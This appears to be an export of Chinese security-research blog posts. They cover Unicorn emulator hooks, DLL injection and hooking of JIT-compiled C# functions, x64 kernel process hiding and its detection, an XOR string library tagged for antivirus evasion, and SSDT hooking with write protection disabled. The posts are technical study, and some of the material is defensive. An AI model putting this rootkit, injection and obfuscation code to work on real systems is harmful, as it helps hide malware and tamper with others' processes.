是有作用范围的（见hook_add begin参数）。 python包中的hook_add函数原型如下 def hook_add(self, htype, callback, user_data=None, begin=1, end=0, arg1=0): pass htype 就是Hook的类型，callback是hook回调用； callback 是Hook的处理handler指针。请注意！不同类型的hook，handler的参数定义也是不同的。 user_data 附加参数，所有的handler都有一个user_data参数，由这里传值。 begin hook 作用范围起始地址 end hook 作用范围结束地址，默认则作用于所有代码。 Hook callback不同类型的hook，对应的callback的参数也不相同，这里只给出C语言定义。 UC_HOOK_CODE &amp; UC_HOOK_BLOCK typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data); /* address: 当前执行的指令地址 size: 当前指令的长度，如果长度未知，则为0 user_data: hook_add 设置的user_data参数 */ READ, WRITE &amp; FETCH typedef void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type, uint64_t address, int size, int64_t value, void *user_data); /* type: 内存操作类型 READ, or WRITE address: 当前指令地址 size: 读或写的长度 value: 写入的值（type = read时无视） user_data: hook_add 设置的user_data参数 */ invalid memory access events (UNMAPPED and PROT events) typedef bool (*uc_cb_eventmem_t)(uc_engine *uc, uc_mem_type type, uint64_t address, int size, int64_t value, void *user_data); /* type: 内存操作类型 READ, or WRITE address: 当前指令地址 size: 读或写的长度 value: 写入的值（type = read时无视） user_data: hook_add 设置的user_data参数 */ Hook 回调返回值返回真，继续模拟执行返回假，停止模拟执行 Unicorn 导入处理器相关的常量Unicorn 支持多种不同的CPU指令集，每一种指令集都有自己独立的寄存器, Unicorn使用统一API管理多种不同的CPU指令集，并将寄存器名字映射成数字常量。 from unicorn.arm_const import * from unicorn.arm64_const import * from unicorn.m68k_const import * from unicorn.mips_const import * from unicorn.sparc_const import * from unicorn.x86_const import * 寄存器常量命名规则UC_ + 指令集 + REG + 大写寄存器名 如：UC_ARM_REG_R0 如：UC_X86_REG_EAX 映射内存想用Unicorn模拟执行代码，是不能将代码字节流直接以参数形式传递给Unicorn，而是将要执行的代码写入到Unicorn的虚拟内存中。Uc虚拟机实例初始内存是没有任何映射的，在读写内存之前使用uc_mem_map函数映射一段内存。 # map 2MB memory for this emulation ADDRESS = 0x10000 mu.mem_map(ADDRESS, 2 * 0x10000) 这段代码在内存地址0x10000处映射了一段大小为2M的内存。注意：要求 address 和 size 参数都与0x1000对齐,否则会报UC_ERR_ARG异常。 参考https://github.com/unicorn-engine/unicorn/tree/master/samples","categories":[],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"用C做C#的注入和HOOK","slug":"hookCSharpWithC","date":"2021-10-13T09:08:36.000Z","updated":"2021-10-25T08:11:12.746Z","comments":true,"path":"2021/10/13/hookCSharpWithC/","link":"","permalink":"http://example.com/2021/10/13/hookCSharpWithC/","excerpt":"","text":"JIT临时编译现象观察为了某个目的，我设计一些简单的实验，最后做了一下笔记，以下是笔记内容。 C#程序是通过JIT临时编译而成,所以每次函数编译后的代码存放在一个随机的内存地址，如果我们想使用C进行HOOK，则需要取得这个随即地址。 首先对这个现象进行观察： 1、创建观察对象，这里我选择命令行应用就足够了 2、将默认生成的代码稍作修改 using System; using System.Reflection; namespace DemoAlice { class Program { static public void Main(string[] args) { test(123); while (true) { MethodInfo mi = typeof(Program).GetMethod(\"test\"); Console.WriteLine(string.Format(\"{0:X8}\", (int)mi.MethodHandle.GetFunctionPointer())); } } static public void test(int num) { int a, b, c; a = 0x20; b = 0x10; c = a + b; Console.WriteLine(\"someThing : \" + num.ToString()); } } } 这里用到了C#中的反射方法拿到test函数地址这个test也是后续我们用来测试hook的函数 运行之后，我们可以看到这个函数地址。 其中0x2AA098A地址开始显然是我们的test代码逻辑，说明这个函数位置找对了，且临时编译的代码也是寻常的汇编字节码，并不是具有虚拟意义的字节码，这样也就是说寻常的二进制字节码只要插入这段内存，就可以修改原本的程序逻辑，剩下的问题就只有如何定位这段代码了。 在重复运行后可以观察得到，每次临时编译后的临时代码也是相同的。 基于上述观察不难得到两种定位的思路 第一种：通过C++/CLI的特性，同样使用反射也能够拿到编译后的函数地址。 第二种：通过快速搜索内存的方法，直接搜索临时代码的特征。 注入为了测试我的HOOK方法是否好用，那么随便写个远程线程注入吧，毕竟重点不在这。 由于是做实验，我这里的路径什么的就很随意的写死了。 #include &lt;Windows.h> #include &lt;stdio.h> int main() { DWORD Pid = 0; printf(\"PID : \"); scanf_s(\"%d\", &amp;Pid); HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid); char fileName[100] = \"C:\\\\Users\\\\admin\\\\source\\\\repos\\\\DemoAlice\\\\Debug\\\\injectordll.dll\"; LPVOID pszLibFileRemote = VirtualAllocEx(hProc, NULL, 0x100, MEM_COMMIT, PAGE_READWRITE); DWORD n = WriteProcessMemory(hProc, pszLibFileRemote, fileName, 60, NULL); PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L\"Kernel32\"), \"LoadLibraryA\"); HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL); CloseHandle(hProc); system(\"pause\"); } 定位test函数使用C++/CLI的反射拿到函数地址创建一个C++的DLL项目，需要修改一下项目配置打开公共语言运行时支持 一致性模式选择NO 然后编写DLL代码 // dllmain.cpp : Defines the entry point for the DLL application. #include \"pch.h\" #include &lt;stdio.h> using namespace System; using namespace Reflection; void showTest() { Type^ type = Type::GetType(\"DemoAlice.Program,DemoAlice\"); MethodInfo^ method = type->GetMethod(\"test\", BindingFlags::Static | BindingFlags::Public); PVOID address = (PVOID)method->MethodHandle.GetFunctionPointer(); char DebugString[1024] = { 0 }; sprintf_s(DebugString, 1024, \"[+] : 0x%x\\r\\n\", address); OutputDebugStringA(DebugString); sprintf_s(DebugString, 1024, \"[+] : 0x%x\\r\\n\", *(DWORD*)address); OutputDebugStringA(DebugString); } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { HANDLE hThread; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)showTest, NULL, NULL, NULL); CloseHandle(hThread); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 从输出中看到这种定位是成功的 纯C也可以使用特征定位直接上代码 #include \"pch.h\" #include &lt;stdio.h> void showTest() { SYSTEM_INFO sysinfo = { 0 }; GetSystemInfo(&amp;sysinfo); char* p = (char *)sysinfo.lpMinimumApplicationAddress; MEMORY_BASIC_INFORMATION meminfo = { 0 }; DWORD targetAddr = 0; char DebugString[1024] = { 0 }; while (p &lt; sysinfo.lpMaximumApplicationAddress) { size_t size = VirtualQueryEx((HANDLE)-1, p, &amp;meminfo, sizeof(MEMORY_BASIC_INFORMATION)); if (size != sizeof(MEMORY_BASIC_INFORMATION))break; if (meminfo.Protect == PAGE_EXECUTE_READWRITE) { int addr = (int)meminfo.BaseAddress; for (int i = 0; i &lt; meminfo.RegionSize; i++) { if (*(BYTE*)(addr + i) == 0x55 &amp;&amp; *(BYTE*)(addr + i + 1) == 0x8B &amp;&amp; *(BYTE*)(addr + i + 2) == 0xEC &amp;&amp; *(BYTE*)(addr + i + 3) == 0x83 &amp;&amp; *(BYTE*)(addr + i + 4) == 0xEC &amp;&amp; *(BYTE*)(addr + i + 5) == 0x1C &amp;&amp; *(BYTE*)(addr + i + 6) == 0x33 &amp;&amp; *(BYTE*)(addr + i + 7) == 0xC0 &amp;&amp; *(BYTE*)(addr + i + 8) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 9) == 0x45 &amp;&amp; *(BYTE*)(addr + i + 10) == 0xEC &amp;&amp; *(BYTE*)(addr + i + 11) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 12) == 0x45 &amp;&amp; *(BYTE*)(addr + i + 13) == 0xE8 &amp;&amp; *(BYTE*)(addr + i + 14) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 15) == 0x45 &amp;&amp; *(BYTE*)(addr + i + 16) == 0xE4 &amp;&amp; *(BYTE*)(addr + i + 17) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 18) == 0x4D &amp;&amp; *(BYTE*)(addr + i + 19) == 0xFC) { targetAddr = addr + i; break; } } } p += meminfo.RegionSize; if (targetAddr)break; } sprintf_s(DebugString, 1024, \"[+] : 0x%x\\r\\n\", targetAddr); OutputDebugStringA(DebugString); } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { HANDLE hThread; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)showTest, NULL, NULL, NULL); CloseHandle(hThread); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 可以看到结果，确实能够快速定位到目标函数 最后，HOOKHOOK部分各种HOOk姿势其实都是可以的，我这里就用我用的比较顺手的钩子库MinHook #include \"pch.h\" #include &lt;stdio.h> #include \"MinHook.h\" #pragma comment(lib,\"libMinHook.lib\") PVOID OriginAddr = 0; void realHookThing() { printf(\"hello C#,I'm C++\\n\"); } void __declspec(naked)MyTest() { __asm { call realHookThing; mov ecx, 22b8h; jmp OriginAddr; } } void showTest() { SYSTEM_INFO sysinfo = { 0 }; GetSystemInfo(&amp;sysinfo); char* p = (char *)sysinfo.lpMinimumApplicationAddress; MEMORY_BASIC_INFORMATION meminfo = { 0 }; DWORD targetAddr = 0; char DebugString[1024] = { 0 }; while (p &lt; sysinfo.lpMaximumApplicationAddress) { size_t size = VirtualQueryEx((HANDLE)-1, p, &amp;meminfo, sizeof(MEMORY_BASIC_INFORMATION)); if (size != sizeof(MEMORY_BASIC_INFORMATION))break; if (meminfo.Protect == PAGE_EXECUTE_READWRITE) { int addr = (int)meminfo.BaseAddress; for (int i = 0; i &lt; meminfo.RegionSize; i++) { if (*(BYTE*)(addr + i) == 0x55 &amp;&amp; *(BYTE*)(addr + i + 1) == 0x8B &amp;&amp; *(BYTE*)(addr + i + 2) == 0xEC &amp;&amp; *(BYTE*)(addr + i + 3) == 0x83 &amp;&amp; *(BYTE*)(addr + i + 4) == 0xEC &amp;&amp; *(BYTE*)(addr + i + 5) == 0x1C &amp;&amp; *(BYTE*)(addr + i + 6) == 0x33 &amp;&amp; *(BYTE*)(addr + i + 7) == 0xC0 &amp;&amp; *(BYTE*)(addr + i + 8) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 9) == 0x45 &amp;&amp; *(BYTE*)(addr + i + 10) == 0xEC &amp;&amp; *(BYTE*)(addr + i + 11) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 12) == 0x45 &amp;&amp; *(BYTE*)(addr + i + 13) == 0xE8 &amp;&amp; *(BYTE*)(addr + i + 14) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 15) == 0x45 &amp;&amp; *(BYTE*)(addr + i + 16) == 0xE4 &amp;&amp; *(BYTE*)(addr + i + 17) == 0x89 &amp;&amp; *(BYTE*)(addr + i + 18) == 0x4D &amp;&amp; *(BYTE*)(addr + i + 19) == 0xFC) { targetAddr = addr + i; break; } } } p += meminfo.RegionSize; if (targetAddr)break; } sprintf_s(DebugString, 1024, \"[+] : 0x%x\\r\\n\", targetAddr); OutputDebugStringA(DebugString); if (MH_Initialize() != MH_OK) { return; } // Create a hook for MessageBoxW, in disabled state. if (MH_CreateHook((LPVOID)targetAddr, (LPVOID)MyTest, reinterpret_cast&lt;LPVOID*>(&amp;OriginAddr)) != MH_OK) { return; } if (MH_EnableHook((LPVOID)targetAddr) != MH_OK) { return; } } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { HANDLE hThread; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)showTest, NULL, NULL, NULL); CloseHandle(hThread); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 为了看到效果，我们修改一下C# ，让他不停调用test函数 using System; using System.Reflection; namespace DemoAlice { class Program { static public void Main(string[] args) { while (true) { test(123); //MethodInfo mi = typeof(Program).GetMethod(\"test\"); //Console.WriteLine(string.Format(\"{0:X8}\", (int)mi.MethodHandle.GetFunctionPointer())); } } static public void test(int num) { int a, b, c; a = 0x20; b = 0x10; c = a + b; Console.WriteLine(\"someThing : \" + num.ToString()); } } } 最后看到效果 最后一点想法通过上述的一些简单实验，不难看出，就算是C#这种即时编译的语言，我们依旧可以从底层去做一些攻防相关的事情 依我拙见，接下来可以做的事情有： 1、由于即时编译的特性，只要函数被调用了，就会在内存的某一块地方存在相应的汇编代码。内存快速查找可以方便的定位到特征，这一点可以做很多事，比如反病毒、反木马、游戏关键逻辑修改等等。 2、有一点骚的想法是我自己注我自己，C#的功能或许可以通过上述的方式，在注入时把对应的目标汇编代码加密，然后把解密函数写到HOOK的部分，甚至把部分功能拆开写，一部分写到HOOK的逻辑里，这样的程序功能仍然能够保证，但是单独分析C#程序和注入用的DLL就比较难发现完整的逻辑，两个文件彼此之间也没有太强的联系。我认为这一点也同样可以用在攻防里。 3、。。。。 想做的事情很多，还得一个个实验过去，慢慢来吧。","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"}]},{"title":"X64下进程的检测与隐藏","slug":"ProcessHideAndDetect","date":"2021-09-06T03:07:17.000Z","updated":"2021-10-25T08:07:25.202Z","comments":true,"path":"2021/09/06/ProcessHideAndDetect/","link":"","permalink":"http://example.com/2021/09/06/ProcessHideAndDetect/","excerpt":"","text":"本文将介绍在R0下的，两种方法隐藏进程，以及四种方法侦测隐藏进程 隐藏方法Eprocess.ActiveProcessLinks断链在Eprocess结构体中，有一个名为ActiveProcessLinks双向链表，通过遍历这个双向链表，可以获取系统中所有的EPROCESS结构。 而我们想要隐藏进程就需要这条链表上没有我们的信息。 所以我们可以通过摘链表的方式，将我们的目标进程隐藏起来。 代码如下 NTSTATUS HideProcess(PEPROCESS eProcess) { KdPrintEx((77, 0, \"[+] StartHide = %llx\\r\\n\", eProcess)); RemoveEntryList((PUCHAR)eProcess + 0x2f0); InitializeListHead((PUCHAR)eProcess + 0x2f0); } 这其中之所以要在摘除链表后，重新初始化的原因是因为：关闭进程时，系统会完成一次摘链表的操作，如果我们不初始化，则会保留本进程的前节点与后节点，导致操作系统对这两个节点进行拼接。这样一来如果它两已经不存在或者有着其他什么原因，就会导致蓝屏。 全局句柄表伪装在全局句柄表中，存放着系统的进程、线程信息。 x64下，为了拿到PspCidTable的地址，我们可以使用特征搜索的方式。 PUCHAR startAddr = searchNtCode(\"48******F7*****74*488BD1488BC8E8\", 0); PULONG_PTR CidTableStartAddr = NULL; if (*(startAddr) == 0x48 &amp;&amp; *(startAddr + 1) == 0x8b &amp;&amp; *(startAddr + 2) == 0x05) { CidTableStartAddr = *(PULONG_PTR)(((ULONG_PTR)(*(PULONG)(startAddr + 3) + (startAddr + 7)) &amp; 0xFFFFFFFF) + ((ULONG_PTR)(startAddr + 7) &amp; 0xFFFFFFFF00000000)); KdPrintEx((77, 0, \"CidTableStartAddr : 0x%llx\\r\\n\", CidTableStartAddr)); } 值得一提的是64位下的运算，由于每个内核模块拥有自己的独立4G空间，所以对于每一个模块内的偏移地址计算，需要抹除高地址的进位，即以ULONG的长度进行计算。 接下来就是解析全局句柄表，将我们的目标进程的句柄从全局句柄表中抹除。 完整代码如下 PUCHAR startAddr = searchNtCode(\"48******F7*****74*488BD1488BC8E8\", 0); PULONG_PTR CidTableStartAddr = NULL; if (*(startAddr) == 0x48 &amp;&amp; *(startAddr + 1) == 0x8b &amp;&amp; *(startAddr + 2) == 0x05) { CidTableStartAddr = *(PULONG_PTR)(((ULONG_PTR)(*(PULONG)(startAddr + 3) + (startAddr + 7)) &amp; 0xFFFFFFFF) + ((ULONG_PTR)(startAddr + 7) &amp; 0xFFFFFFFF00000000)); KdPrintEx((77, 0, \"CidTableStartAddr : 0x%llx\\r\\n\", CidTableStartAddr)); ULONG_PTR RealSize = *CidTableStartAddr; PULONG_PTR FirstTable = *(CidTableStartAddr + 1) &amp; 0xFFFFFFFFFFFFFFFC; PULONG_PTR SecondTableAddr = NULL; PULONG_PTR SystemTableHandle = NULL; for (ULONG_PTR i = 0; i &lt; RealSize / 0x10; i++) { SecondTableAddr = *(FirstTable + i); POBJECT_TYPE OneHandleType = NULL; if (!SecondTableAddr)break; for (size_t j = 0; j &lt; 0x1000 / 0x10; j++) { if (j == 1 &amp;&amp; i == 0) { SystemTableHandle = *(SecondTableAddr + 2 * j); } PVOID Object = 0xFFFF000000000000 | (*(SecondTableAddr + 2 * j) >> 16); if (Object == eProcess) { OldAddr = SecondTableAddr + 2 * j; OldHandle = *(SecondTableAddr + 2 * j); *(SecondTableAddr + 2 * j) = SystemTableHandle; break; } } } } 其中需要注意的是，不能够将句柄表的值直接抹0，在我的实验中，如果直接抹0，会导致在隐藏进程关闭时，直接造成蓝屏。 我的处理办法是通过移花接木的方法，偷一个进程的句柄，直接填在我们的隐藏进程的句柄表的位置，这样再关闭进程，就不会蓝屏了。 检测方法全局句柄表枚举枚举全局句柄表方法同上 Eprocess.ActiveProcessLinks链表枚举枚举进程链表时，需要注意的是，每个链表的值都是在EPROCESS的腰上。所以需要减去相应的便宜才能获取对象地址。 KTHREAD.Process （稍强）这个位置的值，记录的是每个线程由哪一个进程创建，所以通过这个值，能够很给力的发现一些通过上述隐藏方法隐藏的进程。而且在我的实验中，如果将线程的这个位清空，可能会导致蓝屏。所以如果进程隐藏了，查这个基本上八九不离十都能查出来。 KTHREAD.ThreadListEntry遍历 （很强、不准）这个链表就更厉害了，连一些已经关闭的进程也能够查出来痕迹。同样的，如果将进程从这个链表上摘除，会导致蓝屏。所以进程隐藏对这个是没有用的。 附完整的检测代码。 NTSTATUS GetProcessHandleTableInfoWin10(char* result) { PUCHAR startAddr = searchNtCode(\"48******F7*****74*488BD1488BC8E8\", 0); PULONG_PTR CidTableStartAddr = NULL; if(*(startAddr) == 0x48 &amp;&amp; *(startAddr +1) == 0x8b &amp;&amp; *(startAddr + 2)== 0x05) { PULONG_PTR AllEProcess = ExAllocatePool(PagedPool, 4096 * 8); PBOOLEAN HiddenFlags = ExAllocatePool(PagedPool, 4096); memset(AllEProcess, 0, 4096 * 8); memset(HiddenFlags, 0, 4096); ULONG_PTR AllEProcessIndex = 0; CidTableStartAddr = *(PULONG_PTR)(((ULONG_PTR)(*(PULONG)(startAddr + 3) + (startAddr + 7)) &amp; 0xFFFFFFFF ) + ((ULONG_PTR)(startAddr+7) &amp; 0xFFFFFFFF00000000)); KdPrintEx((77, 0, \"CidTableStartAddr : 0x%llx\\r\\n\", CidTableStartAddr)); //sprintf(result, \"CidTableStartAddr : 0x%llx\", CidTableStartAddr); //1.先遍历句柄表，找进程 从逻辑上来说，句柄表找到的进程都不是隐藏的 //这里偷个懒，只处理二级句柄表 ULONG_PTR RealSize = *CidTableStartAddr; PULONG_PTR FirstTable = *(CidTableStartAddr + 1) &amp; 0xFFFFFFFFFFFFFFFC; PULONG_PTR SecondTableAddr = NULL; PEPROCESS eprocess = NULL; ULONG PID = 0; for (ULONG_PTR i = 0; i &lt; RealSize / 0x10 ; i++) { SecondTableAddr = *(FirstTable + i); //KdPrintEx((77, 0, \"SecondTableAddr : 0x%llx\\r\\n\", SecondTableAddr)); POBJECT_TYPE OneHandleType = NULL; if (!SecondTableAddr)break; for (size_t j = 0; j &lt; 0x1000 / 0x10; j++) { PVOID Object = 0xFFFF000000000000 | (*(SecondTableAddr + 2 * j) >> 16); PID = 4 * (j + (i * 0x1000 / 0x10)); if (!MmIsAddressValid(Object))continue; if (*PsProcessType == ObGetObjectType(Object)) { HiddenFlags[AllEProcessIndex] = 0; AllEProcess[AllEProcessIndex++] = Object; } } } //2.查进System的进程链表 ULONG_PTR CurrentEntry = ((PUCHAR)AllEProcess[0] + 0x2f0); ULONG_PTR NewEntry = *(PULONG_PTR)CurrentEntry; BOOLEAN isHidden = TRUE; do { for (size_t i = 0; i &lt; AllEProcessIndex; i++) { if (NewEntry - 0x2f0 == AllEProcess[i]) { isHidden = FALSE; break; } } if (isHidden) { HiddenFlags[AllEProcessIndex] = isHidden; AllEProcess[AllEProcessIndex++] = NewEntry - 0x2f0; } NewEntry = *(PULONG_PTR)NewEntry; } while (CurrentEntry != NewEntry); //3.遍历线程的父进程，看看有没有漏网之鱼 for (size_t i = 4; i &lt; 0x800000; i+=4) { PETHREAD pEthread = NULL; //if (i == 7276) DbgBreakPoint(); NTSTATUS status = PsLookupThreadByThreadId(i,&amp;pEthread); if (!NT_SUCCESS(status))continue; isHidden = TRUE; PEPROCESS eProcess = IoThreadToProcess(pEthread); do { if (!MmIsAddressValid(eProcess) || *PsProcessType != ObGetObjectType(eProcess))break; size_t j = 0; for (j = 0; j &lt; AllEProcessIndex; j++) { if (eProcess == AllEProcess[j]) { isHidden = FALSE; break; } } if (isHidden) { HiddenFlags[AllEProcessIndex] = isHidden; AllEProcess[AllEProcessIndex++] = eProcess; break; } } while (0); //4.获取线程链表,看看有没有漏网之鱼 eProcess = (*(PULONG_PTR)((PUCHAR)pEthread + 0x2f8)) - 0x30; if (!MmIsAddressValid(eProcess) || *PsProcessType != ObGetObjectType(eProcess)) continue; for (size_t j = 0; j &lt; AllEProcessIndex; j++) { if (eProcess == AllEProcess[j]) { isHidden = FALSE; break; } } if (isHidden) { HiddenFlags[AllEProcessIndex] = isHidden; AllEProcess[AllEProcessIndex++] = eProcess; } } ExFreePool(AllEProcess); ExFreePool(HiddenFlags); for (size_t i = 0; i &lt; AllEProcessIndex; i++) { analyzeProcess(AllEProcess[i], result, HiddenFlags[i]); } } return STATUS_SUCCESS; }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"常量变换防特征","slug":"xorString","date":"2021-09-06T02:03:46.000Z","updated":"2021-10-25T08:18:27.110Z","comments":true,"path":"2021/09/06/xorString/","link":"","permalink":"http://example.com/2021/09/06/xorString/","excerpt":"","text":"分享一个常量预处理的库，可以实现每次编译常量随机加密，并在运行时解密的功能。 #pragma once #include &lt;string> #include &lt;utility> #include &lt;array> #ifdef _DEBUG template&lt;typename _chartype, size_t _length> class XorStr { public: constexpr XorStr(const _chartype(&amp;str)[_length]) : XorStr(str, std::make_index_sequence&lt;length>()) {} // returns pointer to unencrypted string // caution: invalid if object gets destructed operator const _chartype* () { return data; } // length in characters (not including 0-terminator) static constexpr size_t length = _length - 1; private: template&lt;size_t... _indices> constexpr XorStr(const _chartype(&amp;str)[_length], std::index_sequence&lt;_indices...>) : data{ str[_indices]... }, encrypted(false) {} _chartype data[_length]; bool encrypted; }; template&lt;typename _chartype, size_t _length> constexpr auto _xor_(_chartype const (&amp;str)[_length]) { return XorStr&lt;_chartype, _length>(str); } #else template&lt;typename _chartype, size_t _length> class XorStr { public: constexpr XorStr(const _chartype(&amp;str)[_length]) : XorStr(str, std::make_index_sequence&lt;_length>()) {} ~XorStr() { for (size_t t = 0; t &lt; _length; t++) data[t] = 0; } // returns pointer to unencrypted string // cation: invalid if object gets destructed operator const _chartype* () { decrypt(); return data; } // length in characters (not including 0-terminator) static constexpr size_t length = _length - 1; private: template&lt;size_t... _indices> constexpr XorStr(const _chartype(&amp;str)[_length], std::index_sequence&lt;_indices...>) : data{ crypt(str[_indices], _indices)... }, encrypted(true) {} static constexpr auto XOR_KEY = static_cast&lt;_chartype>( (__TIME__[7] - '0') + (__TIME__[6] - '0') * 10 + (__TIME__[4] - '0') * 60 + (__TIME__[3] - '0') * 600 + (__TIME__[1] - '0') * 3600 + (__TIME__[0] - '0') * 36000 ); static constexpr auto crypt(_chartype c, size_t i) { return static_cast&lt;_chartype>(c ^ (XOR_KEY + i)); } inline void decrypt() { if (encrypted) { for (size_t t = 0; t &lt; _length; t++) { data[t] = crypt(data[t], t); } encrypted = false; } } _chartype data[_length]; bool encrypted; }; template&lt;typename _chartype, size_t _length> constexpr auto _xor_(_chartype const (&amp;str)[_length]) { return XorStr&lt;_chartype, _length>(str); } #endif 使用方法例如 #include &lt;Windows.h> #include &lt;stdio.h> #include \"xorstr.hpp\" int main() { printf(_xor_(\"Hello World!\\r\\n\")); system(\"pause\"); } 保护效果如图","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"SSDT64位总结","slug":"SSDTAll","date":"2021-08-22T13:39:22.000Z","updated":"2021-10-25T08:04:27.717Z","comments":true,"path":"2021/08/22/SSDTAll/","link":"","permalink":"http://example.com/2021/08/22/SSDTAll/","excerpt":"","text":"SSDT表的变化在64位下，SSDT表在内存中的表项存储的是在KiServiceTable基础上的偏移，大小为4字节。 而在64位的内存分布下，每一个驱动都拥有自己独立的4G空间，所以如果想要对SSDT表进行HOOK，就不能采取直接替换SSDT表的方式来进行HOOK，因为无论怎么修改偏移，也无法脱离ntoskrnl.exe的程序空间。 所以我们在x64的环境下，需要采取全新的HOOK姿势（狗头） HOOK方法如果我们想要Hook64位操作系统的SSDT表，我们通常是通过ntoskrnl.exe进行一次中转（即跳板）完成对SSDT的HOOK。 例如，当我们想HOOK服务号为31的函数，我们有下面的几个步骤需要完成 1 寻找ntoskrnl.exe中的空白可执行内存A，12字节即可。 2 在内存A中写入JMP的SHELLCODE，跳向我们的HOOK处理函数。 3 计算内存A距离KiServiceTable的偏移 4 将偏移填入服务号为31的SSDT表的位置 如此，便能成功使用JMP突破4G的限制。 偏移算法在64位下，通过寻到的SSDT偏移，需要经过一点变换才能得到真实的函数地址。 具体算法如下: offset = *(PULONG)((PCH)SsdtBase + 4 * i); if(offset &amp; 0x80000000) { SsdtFuncAddr = 0xfffffffeffffffff &amp; (SsdtBase + (0xf0000000 | (offset >> 4))); } else { SsdtFuncAddr = (offset >> 4) + SsdtBase; } 边边角角的注意事项在实际的HOOK实现中，需要注意几个点 1 SSDT表的页属性为不可写 2 通常来说，找到写跳板SHELLCODE的位置也是不可写的 3 64位下，KeServiceDescriptorTable未导出，需要通过MSR去获取 4 HOOK要记得不要破坏函数原有功能，注意保存现场 HOOK代码#pragma once #include \"ezssdt.h\" #include \"../findcode.h\" #include \"../EzModule/Module.h\" #include \"../tools.h\" EXTERN_C SSDTHookEntry(); ULONG_PTR KeServiceDescriptorTable = 0; ULONG_PTR hookPlace = 0; EXTERN_C ULONG_PTR oldFunAddr = 0; PUCHAR gMapCheck = NULL; ULONG_PTR ntosklAddr = NULL; ULONG_PTR ntosklSize = NULL; BOOLEAN SsdtCheckInit() { if (gMapCheck) return TRUE; PWCH path = GetSystemRootSYSPath(); gMapCheck = MapOfViewFile(path); ExFreePool(path); return TRUE; } VOID SsdtCheckDestory() { if (!gMapCheck) return; UmMapOfViewFile(gMapCheck); gMapCheck = NULL; } KIRQL CloseWriteProtection() { KIRQL irql = KeRaiseIrqlToDpcLevel(); ULONG_PTR cr0 = __readcr0(); cr0 &amp;= 0xfffffffffffeffff; _disable(); __writecr0(cr0); return irql; } VOID OpenWriteProtection(KIRQL irql) { ULONG_PTR cr0 = __readcr0(); cr0 |= 0x10000; __writecr0(cr0); _enable(); KeLowerIrql(irql); } ULONG_PTR GetKeServiceDescriptorTable64() //我的方法 { PUCHAR StartSearchAddress = (PUCHAR)__readmsr(0xC0000082); PUCHAR EndSearchAddress = StartSearchAddress + 0x500; PUCHAR i = NULL; UCHAR b1 = 0, b2 = 0, b3 = 0; ULONG templong = 0; ULONG_PTR addr = 0; for (i = StartSearchAddress; i &lt; EndSearchAddress; i++) { if (MmIsAddressValid(i) &amp;&amp; MmIsAddressValid(i + 1) &amp;&amp; MmIsAddressValid(i + 2)) { b1 = *i; b2 = *(i + 1); b3 = *(i + 2); if (b1 == 0x4c &amp;&amp; b2 == 0x8d &amp;&amp; b3 == 0x15) //4c8d15 { memcpy(&amp;templong, i + 3, 4); addr = (ULONG_PTR)templong + (ULONG_PTR)i + 7; return addr; } } } return 0; } NTSTATUS GetSSDTInfoX64(char* result) { if (!KeServiceDescriptorTable) { KeServiceDescriptorTable = GetKeServiceDescriptorTable64(); ntosklSize = QuerySysModule(\"ntkrnlpa.exe\", &amp;ntosklAddr); } KdPrintEx((77, 0, \"KeServiceDescriptorTable : %llx\\r\\n\", KeServiceDescriptorTable)); DWORD32 SsdtCount = *(PDWORD32)((PCH)KeServiceDescriptorTable + 0x10); //获取SSDT个数 KdPrintEx((77, 0, \"SsdtCount : %x\\r\\n\", SsdtCount)); ULONG_PTR SsdtBase = *(PULONG_PTR)KeServiceDescriptorTable; DWORD32 offset = NULL; DWORD32 SafeFlag; ULONG_PTR SsdtFuncAddr = NULL; for (int i = 0; i &lt; SsdtCount; i++) { SafeFlag = 0; offset = *(PULONG)((PCH)SsdtBase + 4 * i); if(offset &amp; 0x80000000) { SsdtFuncAddr = 0xfffffffeffffffff &amp; (SsdtBase + (0xf0000000 | (offset >> 4))); } else { SsdtFuncAddr = (offset >> 4) + SsdtBase; } if ((SsdtFuncAddr > ntosklAddr) &amp;&amp; (SsdtFuncAddr &lt; (ntosklAddr + ntosklSize))) { SafeFlag = 1; } sprintf(result, \"%s%d\\t%llx\\t%d\\n\", result, i, SsdtFuncAddr, SafeFlag); } 